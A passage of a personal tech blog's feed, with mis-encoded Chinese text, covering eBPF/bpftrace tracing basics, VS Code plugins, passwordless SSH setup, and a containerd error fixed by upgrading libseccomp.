    <content type="html"><![CDATA[<h2 id="ç¬¬1ç« -å¼•è¨€-20230406-å››-19-00-21-00"><a href="#ç¬¬1ç« -å¼•è¨€-20230406-å››-19-00-21-00" class="headerlink" title="ç¬¬1ç«  å¼•è¨€ 20230406(å››)19:00-21:00"></a>ç¬¬1ç«  å¼•è¨€ 20230406(å››)19:00-21:00</h2><h3 id="1-1-BPFå’ŒeBPFæ˜¯ä»€ä¹ˆ"><a href="#1-1-BPFå’ŒeBPFæ˜¯ä»€ä¹ˆ" class="headerlink" title="1.1 BPFå’ŒeBPFæ˜¯ä»€ä¹ˆ"></a>1.1 BPFå’ŒeBPFæ˜¯ä»€ä¹ˆ</h3><p>BPFçš„è¯ç”Ÿæ˜¯ä¸ºäº†æå‡ç½‘ç»œåŒ…è¿‡æ»¤å·¥å…·çš„æ€§èƒ½</p><p>BPFæä¾›äº†ä¸€ç§å†å„ç§å†…æ ¸äº‹ä»¶å’Œåº”ç”¨ç¨‹åºäº‹ä»¶å‘ç”Ÿæ—¶è¿è¡Œä¸€æ®µå°ç¨‹åºçš„æœºåˆ¶ã€‚</p><p>BPFçš„ä¸‰ä¸ªä¸»è¦åº”ç”¨é¢†åŸŸï¼š</p><ul><li>ç½‘ç»œ</li><li><font color=red>å¯è§‚æµ‹æ€§ (æœ¬ä¹¦é‡ç‚¹å…³æ³¨)</font></li><li>å®‰å…¨</li></ul><h3 id="1-2-è·Ÿè¸ªã€å—…æ¢ã€é‡‡æ ·ã€å‰–æå’Œå¯è§‚æµ‹æ€§åˆ†åˆ«æ˜¯ä»€ä¹ˆ"><a href="#1-2-è·Ÿè¸ªã€å—…æ¢ã€é‡‡æ ·ã€å‰–æå’Œå¯è§‚æµ‹æ€§åˆ†åˆ«æ˜¯ä»€ä¹ˆ" class="headerlink" title="1.2 è·Ÿè¸ªã€å—…æ¢ã€é‡‡æ ·ã€å‰–æå’Œå¯è§‚æµ‹æ€§åˆ†åˆ«æ˜¯ä»€ä¹ˆ"></a>1.2 è·Ÿè¸ªã€å—…æ¢ã€é‡‡æ ·ã€å‰–æå’Œå¯è§‚æµ‹æ€§åˆ†åˆ«æ˜¯ä»€ä¹ˆ</h3><p>è·Ÿè¸ª(tracing)ï¼šåŸºäºäº‹ä»¶çš„è®°å½•<br>è·Ÿè¸ªå·¥å…·ï¼šå…·å¤‡è®°å½•åŸå§‹äº‹ä»¶å’Œäº‹ä»¶å…ƒæ•°æ®çš„èƒ½åŠ›  eg.stranceå·¥å…·ï¼Œå¯ä»¥è®°å½•å’Œæ‰“å°ç³»ç»Ÿè°ƒç”¨äº‹ä»¶çš„ä¿¡æ¯ã€‚<br>BPFæŠ€æœ¯ï¼Œå¯ä»¥ä½¿å¾—è¿™äº›è·Ÿè¸ªå·¥å…·åœ¨äº‹ä»¶å‘ç”Ÿåï¼Œé€šè¿‡è¿è¡Œä¸€æ®µå°ç¨‹åºæ¥è¿›è¡Œå®šåˆ¶åŒ–çš„å®æ—¶ç»Ÿè®¡æ‘˜è¦ç”Ÿæˆæˆ–å…¶ä»–åŠ¨ä½œã€‚<br>å—…æ¢ã€äº‹ä»¶è®°å½•å’Œè·Ÿè¸ªï¼Œé€šå¸¸æŒ‡çš„æ˜¯ä¸€å›äº‹ã€‚</p><p>é‡‡æ ·(sampling)<br>é‡‡æ ·å·¥å…·é€šè¿‡è·å–å…¨éƒ¨è§‚æµ‹é‡çš„å­é›†æ¥æç»˜ç›®æ ‡çš„å¤§è‡´å›¾åƒã€‚<br>é‡‡æ ·å·¥å…·ä¼˜ç‚¹ï¼šæ€§èƒ½å¼€é”€å°<br>é‡‡æ ·å·¥å…·ç¼ºç‚¹ï¼šä¼šé—æ¼äº‹ä»¶</p><p>å¯è§‚æµ‹æ€§(observability)<br>BPFå·¥å…·å±äºå¯è§‚æµ‹æ€§å·¥å…·</p><h3 id="1-3-BCCã€bpftraceå’ŒIO-Visor"><a href="#1-3-BCCã€bpftraceå’ŒIO-Visor" class="headerlink" title="1.3 BCCã€bpftraceå’ŒIO Visor"></a>1.3 BCCã€bpftraceå’ŒIO Visor</h3><p>åœ¨è·Ÿè¸ªç”¨é€”æ–¹é¢ï¼Œä¸»è¦çš„BPFå‰ç«¯æ˜¯BCCå’Œbpftrace</p><h3 id="1-4-åˆè¯†BCCï¼šå¿«é€Ÿä¸Šæ‰‹"><a href="#1-4-åˆè¯†BCCï¼šå¿«é€Ÿä¸Šæ‰‹" class="headerlink" title="1.4 åˆè¯†BCCï¼šå¿«é€Ÿä¸Šæ‰‹"></a>1.4 åˆè¯†BCCï¼šå¿«é€Ÿä¸Šæ‰‹</h3><p>execsnoopå·¥å…·ä¼šè·Ÿè¸ªæ¯ä¸ªæ–°åˆ›å»ºçš„è¿›ç¨‹ï¼Œå¹¶ä¸”ä¸ºæ¯æ¬¡è¿›ç¨‹åˆ›å»ºæ‰“å°ä¸€è¡Œä¿¡æ¯ã€‚<br>execsnoopå·¥å…·æ¥è‡ªBCCé¡¹ç›®ï¼Œé€šè¿‡è·Ÿè¸ªexecveç³»ç»Ÿè°ƒç”¨æ¥å·¥ä½œã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># execsnoop</span><br><span class="hljs-comment"># execsnoop -t    # å¢åŠ ä¸€åˆ—æ—¶é—´æˆ³è¾“å‡º</span><br></code></pre></td></tr></table></figure><p>biolatencyï¼Œå¯ä»¥ç»˜åˆ¶å—è®¾å¤‡çš„å»¶è¿Ÿç›´æ–¹å›¾ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment"># biolatency -m # ç»Ÿè®¡å€¼ä»¥æ¯«ç§’ä¸ºå•ä½è¾“å‡º</span><br></code></pre></td></tr></table></figure><h3 id="1-5-BPFè·Ÿè¸ªçš„èƒ½è§åº¦"><a href="#1-5-BPFè·Ÿè¸ªçš„èƒ½è§åº¦" class="headerlink" title="1.5 BPFè·Ÿè¸ªçš„èƒ½è§åº¦"></a>1.5 BPFè·Ÿè¸ªçš„èƒ½è§åº¦</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230406203131.png" alt="image.png"></p><p><img src="https://github.com/iovisor/bcc/blob/master/images/bcc_tracing_tools_2019.png?raw=true" alt="tool"></p><h3 id="1-6-åŠ¨æ€æ’æ¡©ï¼škprobeså’Œuprobes"><a href="#1-6-åŠ¨æ€æ’æ¡©ï¼škprobeså’Œuprobes" class="headerlink" title="1.6 åŠ¨æ€æ’æ¡©ï¼škprobeså’Œuprobes"></a>1.6 åŠ¨æ€æ’æ¡©ï¼škprobeså’Œuprobes</h3><p>åŠ¨æ€æ’æ¡©æŠ€æœ¯ï¼šåœ¨ç”Ÿäº§ç¯å¢ƒä¸­å¯¹æ­£åœ¨è¿è¡Œçš„è½¯ä»¶æ’å…¥è§‚æµ‹ç‚¹çš„èƒ½åŠ›ã€‚<br>kprobesï¼šå¯¹å†…æ ¸å‡½æ•°çš„åŠ¨æ€æ’æ¡©<br>uprobesï¼šå¯¹ç”¨æˆ·æ€å‡½æ•°çš„åŠ¨æ€æ’æ¡©<br>BPFè·Ÿè¸ªå·¥å…·æ—¢æ”¯æŒkprobesåˆæ”¯æŒuprobesï¼Œå› ä¸ºä¹Ÿå°±æ”¯æŒå¯¹æ•´ä¸ªè½¯ä»¶æ ˆè¿›è¡ŒåŠ¨æ’æ¡©ã€‚</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230406203152.png" alt="image.png"></p><h3 id="1-7-é™æ€æ’æ¡©ï¼štracepointå’ŒUSDT"><a href="#1-7-é™æ€æ’æ¡©ï¼štracepointå’ŒUSDT" class="headerlink" title="1.7 é™æ€æ’æ¡©ï¼štracepointå’ŒUSDT"></a>1.7 é™æ€æ’æ¡©ï¼štracepointå’ŒUSDT</h3><p>BPFè·Ÿè¸ªå·¥å…·æ”¯æŒå†…æ ¸çš„é™æ€è·Ÿè¸ªç‚¹æ’æ¡©æŠ€æœ¯ï¼Œä¹Ÿæ”¯æŒç”¨æˆ·æ€çš„é™æ€å®šä¹‰è·Ÿè¸ªæ’æ¡©æŠ€æœ¯USDTã€‚</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230406203536.png" alt="image.png"></p><h3 id="1-8-åˆè¯†bpftraceï¼šè·Ÿè¸ªopen"><a href="#1-8-åˆè¯†bpftraceï¼šè·Ÿè¸ªopen" class="headerlink" title="1.8 åˆè¯†bpftraceï¼šè·Ÿè¸ªopen()"></a>1.8 åˆè¯†bpftraceï¼šè·Ÿè¸ªopen()</h3><p>bpftraceè·Ÿè¸ªç³»ç»Ÿè°ƒç”¨open</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># bpftrace -e &#x27;tracepoint:syscalls:sys_enter_open &#123; printf(&quot;%s %s\n&quot;, comm, str(args-&gt;filename)); &#125;&#x27;</span><br>Attaching 1 probe...<br>titanagent /proc/574871/status<br>titanagent /proc/574871/cmdline<br>titanagent /proc/574871/stat<br>...<br></code></pre></td></tr></table></figure><p>åˆ—å‡ºæ‰€æœ‰ä¸openç³»ç»Ÿè°ƒç”¨ç›¸å…³çš„è·Ÿè¸ªç‚¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># bpftrace -l &#x27;tracepoint:syscalls:sys_enter_open*&#x27;</span><br>tracepoint:syscalls:sys_enter_open_by_handle_at<br>tracepoint:syscalls:sys_enter_open<br>tracepoint:syscalls:sys_enter_openat<br>tracepoint:syscalls:sys_enter_openat2<br></code></pre></td></tr></table></figure><p>è¯æ˜opennatçš„ä½¿ç”¨é¢‘ç‡æ›´é«˜</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># bpftrace -e &#x27;tracepoint:syscalls:sys_enter_open* &#123; @[probe] = count();  &#125;&#x27;</span><br>Attaching 4 probes...<br>^C<br><br>@[tracepoint:syscalls:sys_enter_open]: 5965<br>@[tracepoint:syscalls:sys_enter_openat2]: 62152<br>@[tracepoint:syscalls:sys_enter_openat]: 670061<br></code></pre></td></tr></table></figure><p>bpftraceè‡ªå¸¦opensnoop.btï¼Œå¯ä»¥åŒæ—¶å¯¹æ¯ä¸ªç³»ç»Ÿè°ƒç”¨çš„å¼€å§‹å’Œç»“æŸä½ç½®è¿›è¡Œè·Ÿè¸ª</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># opensnoop.bt</span><br>Attaching 6 probes...<br>Tracing open syscalls... Hit Ctrl-C to end.<br>PID    COMM               FD ERR PATH<br>3902363 containerd          2   0 /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snap<br>3902363 containerd          2   0 /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snap<br><br></code></pre></td></tr></table></figure><p>bpftraceè‡ªå¸¦20å¤šä¸ªå·¥å…·<br>bccè‡ªå¸¦è¶…è¿‡70ä¸ªå·¥å…·</p><h3 id="1-9-å†å›åˆ°BCCï¼šè·Ÿè¸ªopen"><a href="#1-9-å†å›åˆ°BCCï¼šè·Ÿè¸ªopen" class="headerlink" title="1.9 å†å›åˆ°BCCï¼šè·Ÿè¸ªopen()"></a>1.9 å†å›åˆ°BCCï¼šè·Ÿè¸ªopen()</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># opensnoop</span><br></code></pre></td></tr></table></figure><p>bpftraceå·¥å…·é€šå¸¸æ¯”è¾ƒç®€å•ï¼ŒåŠŸèƒ½å•ä¸€ï¼Œåªåšä¸€ä»¶äº‹æƒ…<br>BCCå·¥å…·åˆ™ä¸€èˆ¬æ¯”è¾ƒå¤æ‚ï¼Œæ”¯æŒçš„è¿è¡Œæ¨¡å¼ä¹Ÿæ¯”è¾ƒå¤š</p><p>BCCå·¥å…·æ›´åŠ é€‚åˆä½œä¸ºå·¥ä½œçš„èµ·ç‚¹ï¼Œä¸å¿…åŠ¨æ‰‹ç¼–å†™ä»»ä½•BPFç¨‹åºï¼Œéœ€è¦çš„åŠŸèƒ½å¯èƒ½éƒ½å·²ç»è‡ªå¸¦äº†<br>å¦‚æœç¡®å®ç¼ºå°‘æ‰€éœ€çš„åŠŸèƒ½ï¼Œå¯ä»¥ç”¨bpftraceæ¥å®šåˆ¶å·¥å…·ï¼Œå› ä¸ºbpftraceè¯­è¨€å¼€å‘ç›¸å¯¹æ›´åŠ ç®€å•</p><h3 id="1-10-å°ç»“"><a href="#1-10-å°ç»“" class="headerlink" title="1.10 å°ç»“"></a>1.10 å°ç»“</h3>]]></content>
    
    
    <categories>
      
      <category>ebpf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€vscodeã€‘å¸¸ç”¨ä¸”å¥½ç”¨æ’ä»¶</title>
    <link href="/2023/04/04/software/%E3%80%90vscode%E3%80%91%E5%B8%B8%E7%94%A8%E4%B8%94%E5%A5%BD%E7%94%A8%E6%8F%92%E4%BB%B6/"/>
    <url>/2023/04/04/software/%E3%80%90vscode%E3%80%91%E5%B8%B8%E7%94%A8%E4%B8%94%E5%A5%BD%E7%94%A8%E6%8F%92%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="yaml"><a href="#yaml" class="headerlink" title="yaml"></a>yaml</h2><p>æ’ä»¶åå­—ï¼šyaml</p><h2 id="json"><a href="#json" class="headerlink" title="json"></a>json</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230723231056.png" alt="image.png"></p><p>é¦–å…ˆæŠŠå†…å®¹ä¿å­˜ä¸ºjsonæ–‡ä»¶ã€‚ç„¶ååœ¨å·¦ä¾§å¯ä»¥ç‚¹å‡»jsonæ’ä»¶ï¼Œç„¶ååœ¨å·¦ä¾§å°±ä¼šå‡ºç°æ˜¾ç¤ºjsonç»“æ„ï¼Œå¯ä»¥æ’æ–¹ä¾¿çš„é‡å‘½åè¿™äº›jsoné”®åã€‚ç„¶ååœ¨æ–‡ä»¶ä¸­ï¼Œå³é”®é€‰æ‹©æ ¼å¼åŒ–æ–‡æ¡£(Format Document)ã€‚è¿™æ˜¯ä¸€è¡Œçš„jsonå­—ç¬¦ä¸²å°±ä¼šè‡ªåŠ¨æ ¼å¼åŒ–æˆjsonåº”æœ‰çš„æ ¼å¼äº†</p>]]></content>
    
    
    <categories>
      
      <category>software</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ç½‘ç»œæˆé•¿è®°ã€‘(202304) ssh-keygenå’Œssh-copy-idå®ç°å…å¯†ç™»å½•</title>
    <link href="/2023/04/01/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91(202304)%20ssh-keygen%E5%92%8Cssh-copy-id%E5%AE%9E%E7%8E%B0%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95/"/>
    <url>/2023/04/01/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91(202304)%20ssh-keygen%E5%92%8Cssh-copy-id%E5%AE%9E%E7%8E%B0%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="è·³æ¿æœºAç™»å½•ä¸»æœºB"><a href="#è·³æ¿æœºAç™»å½•ä¸»æœºB" class="headerlink" title="è·³æ¿æœºAç™»å½•ä¸»æœºB"></a>è·³æ¿æœºAç™»å½•ä¸»æœºB</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1.è·³æ¿æœºç”Ÿæˆå…¬é’¥</span><br>æ‰§è¡Œ /bin/ssh-keygen <br>ä¸€è·¯å›è½¦<br><br><span class="hljs-comment"># 2.è·³æ¿æœºçš„å…¬é’¥æ‹·è´åˆ°ä¸»æœºBçš„~/.ssh/authorized_keysæ–‡ä»¶ä¸­</span><br>å¯ä»¥æ‰‹åŠ¨å¤åˆ¶<br>ä¹Ÿå¯ä»¥ç›´æ¥å‘½ä»¤æ“ä½œssh-copy-id<br>ssh-copy-id ç”¨æˆ·å@ä¸»æœºBçš„ipæˆ–è€…hostname<br><br><span class="hljs-comment"># 3.å…å¯†ç™»å½•è¿œç¨‹ä¸»æœº</span><br>/bin/ssh ç”¨æˆ·å@ä¸»æœºBçš„ipæˆ–è€…hostname<br>ä¸éœ€è¦è¾“å…¥å¯†ç ï¼Œç›´æ¥å°±å¯ä»¥ç™»å½•äº†<br></code></pre></td></tr></table></figure><p>æå®š~</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/feinifi/article/details/78213297"># ssh-keygenå’Œssh-copy-idå®ç°å…å¯†ç™»å½•è¿œç¨‹ä¸»æœº</a> è®²äº†æ–¹æ³•å’ŒåŸç†</p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘kubebuilder</title>
    <link href="/2023/03/29/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91kubebuilder/"/>
    <url>/2023/03/29/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91kubebuilder/</url>
    
    <content type="html"><![CDATA[<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://lailin.xyz/post/operator-07-kubebuilder-test.html">7. kubebuilder è¿›é˜¶: æµ‹è¯•</a></p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘kubebuilder</title>
    <link href="/2023/03/29/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91kubebuilder/"/>
    <url>/2023/03/29/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91kubebuilder/</url>
    
    <content type="html"><![CDATA[<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://lailin.xyz/post/operator-07-kubebuilder-test.html">7. kubebuilder è¿›é˜¶: æµ‹è¯•</a></p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€containerdé”™è¯¯è§£å†³ç³»åˆ—ã€‘(202303)failed to create shim task, OCI runtime create failed,  unable to retrieve OCI runtime error, runc did not terminate successfully</title>
    <link href="/2023/03/28/k8s/%E3%80%90containerd%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E7%B3%BB%E5%88%97%E3%80%91(202303)failed%20to%20create%20shim%20task,%20OCI%20runtime%20create%20failed,%20%20unable%20to%20retrieve%20OCI%20runtime%20error,%20runc%20did%20not%20terminate%20successfully/"/>
    <url>/2023/03/28/k8s/%E3%80%90containerd%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E7%B3%BB%E5%88%97%E3%80%91(202303)failed%20to%20create%20shim%20task,%20OCI%20runtime%20create%20failed,%20%20unable%20to%20retrieve%20OCI%20runtime%20error,%20runc%20did%20not%20terminate%20successfully/</url>
    
    <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># cat /etc/redhat-release</span><br>CentOS Linux release 8.0.1905 (Core) <br><br><span class="hljs-comment"># uname -r</span><br>4.18.0-348.rt7.130.el8.x86_64<br></code></pre></td></tr></table></figure><h2 id="é—®é¢˜åŠç°è±¡"><a href="#é—®é¢˜åŠç°è±¡" class="headerlink" title="é—®é¢˜åŠç°è±¡"></a>é—®é¢˜åŠç°è±¡</h2><ol><li>podçš„çŠ¶æ€å…¨éƒ¨éƒ½æ˜¯ContainerCreatingçš„çŠ¶æ€</li></ol><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230328144639.png" alt="image.png"></p><ol start="2"><li>containerdè¿›ç¨‹æœ‰å¤§é‡æŠ¥é”™ï¼Œä¸»è¦æœ‰ï¼š</li></ol><p><code>failed to create containerd task: failed to create shim task: OCI runtime create failed: unable to retrieve OCI runtime error (open /run/containerd/io.containerd.runtime.v2.task/k8s.io/c4847070fad34a8da9b16b5c20cdc38e28a15cfcf9913d712e4fe60d8c9029f7/log.json: no such file or directory): runc did not terminate successfully: exit status 127: unknown</code></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230328144856.png" alt="image.png"></p><h2 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h2><h3 id="æŸ¥çœ‹ç°æœ‰libseccompç‰ˆæœ¬"><a href="#æŸ¥çœ‹ç°æœ‰libseccompç‰ˆæœ¬" class="headerlink" title="æŸ¥çœ‹ç°æœ‰libseccompç‰ˆæœ¬"></a>æŸ¥çœ‹ç°æœ‰libseccompç‰ˆæœ¬</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># sudo rpm -qa | grep libseccomp</span><br>libseccomp-2.3.3-3.el8.x86_64<br><br><br></code></pre></td></tr></table></figure><h3 id="å¸è½½ä½ç‰ˆæœ¬libseccomp"><a href="#å¸è½½ä½ç‰ˆæœ¬libseccomp" class="headerlink" title="å¸è½½ä½ç‰ˆæœ¬libseccomp"></a>å¸è½½ä½ç‰ˆæœ¬libseccomp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># sudo rpm -e libseccomp-2.3.3-3.el8.x86_64 --nodeps</span><br><br><span class="hljs-comment"># sudo rpm -qa | grep libseccomp</span><br><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h3 id="å®‰è£…é«˜ç‰ˆæœ¬libseccomp"><a href="#å®‰è£…é«˜ç‰ˆæœ¬libseccomp" class="headerlink" title="å®‰è£…é«˜ç‰ˆæœ¬libseccomp"></a>å®‰è£…é«˜ç‰ˆæœ¬libseccomp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># yum provides libseccomp</span><br>Last metadata expiration check: 0:48:39 ago on Tue 28 Mar 2023 01:49:06 PM CST.<br>libseccomp-2.5.2-1.el8.i686 : Enhanced seccomp library<br>Repo        : Base<br>Matched from:<br>Provide    : libseccomp = 2.5.2-1.el8<br><br>libseccomp-2.5.2-1.el8.x86_64 : Enhanced seccomp library<br>Repo        : Base<br>Matched from:<br>Provide    : libseccomp = 2.5.2-1.el8<br><br><br><span class="hljs-comment"># yum install libseccomp-2.5.2-1.el8.x86_64</span><br>Last metadata expiration check: 0:49:46 ago on Tue 28 Mar 2023 01:49:06 PM CST.<br>Dependencies resolved.<br>======================================================================================================================================================================<br> Package                                   Arch                                  Version                                    Repository                           Size<br>======================================================================================================================================================================<br>Installing:<br> libseccomp                                x86_64                                2.5.2-1.el8                                Base                                 71 k<br><br>Transaction Summary<br>======================================================================================================================================================================<br>Install  1 Package<br><br>Total download size: 71 k<br>Installed size: 166 k<br>Is this ok [y/N]: y<br>Downloading Packages:<br>libseccomp-2.5.2-1.el8.x86_64.rpm                                                                                                      38 MB/s |  71 kB     00:00    <br>----------------------------------------------------------------------------------------------------------------------------------------------------------------------<br>Total                                                                                                                                 7.0 MB/s |  71 kB     00:00     <br>Running transaction check<br>Transaction check succeeded.<br>Running transaction <span class="hljs-built_in">test</span><br>Transaction <span class="hljs-built_in">test</span> succeeded.<br>Running transaction<br>  Preparing        :                                                                                                                                              1/1 <br>  Installing       : libseccomp-2.5.2-1.el8.x86_64                                                                                                                1/1 <br>  Running scriptlet: libseccomp-2.5.2-1.el8.x86_64                                                                                                                1/1 <br>  Verifying        : libseccomp-2.5.2-1.el8.x86_64                                                                                                                1/1 <br><br>Installed:<br>  libseccomp-2.5.2-1.el8.x86_64                                                                                                                                       <br><br>Complete!<br><br><br><span class="hljs-comment"># sudo rpm -qa | grep libseccomp</span><br>libseccomp-2.5.2-1.el8.x86_64<br></code></pre></td></tr></table></figure><h2 id="è§£å†³åç°è±¡"><a href="#è§£å†³åç°è±¡" class="headerlink" title="è§£å†³åç°è±¡"></a>è§£å†³åç°è±¡</h2><ol><li>podçŠ¶æ€</li></ol><p>å®‰è£…ä¹‹åï¼Œä¸ç”¨é‡å¯containerdè¿›ç¨‹ï¼Œå°±çœ‹åˆ°äº†ç›®å‰podçš„çŠ¶æ€éƒ½æ­£å¸¸äº†</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230328145416.png" alt="image.png"></p><ol start="2"><li>runcä¸­ä¾èµ–çš„libseccomp<br>libseccompå·²ç»æ˜¯é«˜ç‰ˆæœ¬çš„äº†</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># runc --version</span><br>runc version 1.1.4<br>commit: v1.1.4-0-g5fd4c4d1<br>spec: 1.0.2-dev<br>go: go1.18.10<br>libseccomp: 2.5.2<br></code></pre></td></tr></table></figure><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>libseccompéœ€è¦é«˜äº<code>2.4ç‰ˆæœ¬</code></p><p>containerd.io è¦æ±‚å®‰è£…ç‰ˆæœ¬ä¸º 2.4.0 çš„ libseccomp</p><p>å…·ä½“å®˜æ–¹ä¾æ®è¿˜æœªæ‰¾åˆ°ï¼Œåç»­æ‰¾åˆ°è¡¥å……</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.51cto.com/u_12386780/5084112">k8sç³»åˆ—-06-containerdçš„åŸºæœ¬æ“ä½œ</a>  å¸è½½å®‰è£…libeseccomp<br><a href="https://juejin.cn/s/containerd.io%20depends%20libseccomp2%20(%20%3D%202.4.0)%20but%202.3.1-2.1ubuntu4%20is%20to%20be%20installed">containerd.io depends libseccomp2 ( &#x3D; 2.4.0) but 2.3.1-2.1ubuntu4 is to be installed</a></p><h2 id="yumç›¸å…³å‘½ä»¤"><a href="#yumç›¸å…³å‘½ä»¤" class="headerlink" title="yumç›¸å…³å‘½ä»¤"></a>yumç›¸å…³å‘½ä»¤</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 